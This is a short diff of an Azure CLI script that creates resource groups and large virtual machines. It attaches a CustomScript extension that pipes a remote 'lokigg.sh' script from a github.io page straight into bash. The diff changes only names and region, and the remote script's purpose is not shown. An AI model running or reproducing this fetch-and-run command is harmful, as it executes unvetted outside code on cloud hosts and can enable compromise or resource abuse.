@@ -34,11 +34,11 @@ az vm extension set \
   --resource-group myResourceGroup4 \
    --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/lokigg.sh\" | bash"}'
   
-az group create --name myResourceGroup22 --location westus
+az group create --name myResourceGroup2552 --location westus2
 
 
 az vm create \
-    --resource-group myResourceGroup22 \
+    --resource-group myResourceGroup2552 \
     --name myVM22 \
 	--size Standard_F8s_v2 \
     --image UbuntuLTS \
@@ -50,7 +50,7 @@ az vm extension set \
   --version 2.0 \
   --name CustomScript \
   --vm-name myVM22 \
-  --resource-group myResourceGroup22 \
+  --resource-group myResourceGroup2552 \
    --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/lokigg.sh\" | bash"}'
    
 
